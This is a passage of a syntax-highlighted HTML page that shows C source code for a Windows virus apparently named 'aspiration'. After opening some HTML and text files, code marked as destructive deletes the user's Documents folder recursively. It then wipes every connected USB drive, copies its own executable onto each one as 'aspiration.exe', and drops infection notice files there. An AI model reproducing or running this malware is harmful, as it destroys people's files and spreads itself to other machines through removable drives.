        </span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"IExplore.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDirHTML</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SW_MAXIMIZE</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"IExplore.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szWinDirHTML</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SW_MAXIMIZE</span><span class="sc10">);</span><span class="sc0">
    
        </span><span class="sc1">/* Use Notepad to open the two text files */</span><span class="sc0">
        </span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"notepad.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szFileTXT1</span><span class="sc0"> </span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SW_SHOWNORMAL</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"notepad.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szFileTXT2</span><span class="sc0"> </span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SW_SHOWNORMAL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* ############################################################### */</span><span class="sc0">
    </span><span class="sc1">/* --- ---- EVERYTHING BELOW THIS LINE IS DESTRUCTIVE CODE --- --- */</span><span class="sc0">
    </span><span class="sc1">/* ############################################################### */</span><span class="sc0">

    </span><span class="sc11">SHGetFolderPath</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CSIDL_PERSONAL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SHGFP_TYPE_CURRENT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szPersonalFolderPath</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Delete all files and folders recursively in personal folder */</span><span class="sc0">
    </span><span class="sc11">DeleteDirectoryRecursive</span><span class="sc10">(</span><span class="sc11">szPersonalFolderPath</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/*
    If a USB flash drive is connected to the computer:
    -&gt;Delete files and folders recursively
    -&gt;Copy virus to the drive
    -&gt;Copy the two text files to the drive
    */</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">drives</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">   
        </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFile</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">HMODULE</span><span class="sc0"> </span><span class="sc11">Mod</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szUSBPath</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szVirusPath</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwNumberOfBytesWritten</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc11">Mod</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetModuleHandle</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc11">Mod</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szVirusPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szVirusPath</span><span class="sc10">));</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IsItUSB</span><span class="sc10">(</span><span class="sc11">drives</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">DeleteDirectoryRecursive</span><span class="sc10">(</span><span class="sc11">drives</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">

            </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szUSBPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">drives</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
            </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szUSBPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\aspiration.exe"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">szVirusPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szUSBPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szUSBPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">drives</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
            </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szUSBPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\ASPIRATION_INFECTION.txt"</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">szUSBPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CREATE_ALWAYS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szTextFile1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szTextFile1</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">dwNumberOfBytesWritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0"> 
            </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szUSBPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">drives</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
            </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szUSBPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\FOR_AV_SECURITY_COMPANIES.txt"</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">szUSBPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CREATE_ALWAYS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szTextFile2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szTextFile2</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">dwNumberOfBytesWritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0"> 
            </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span></div></body>
</html>
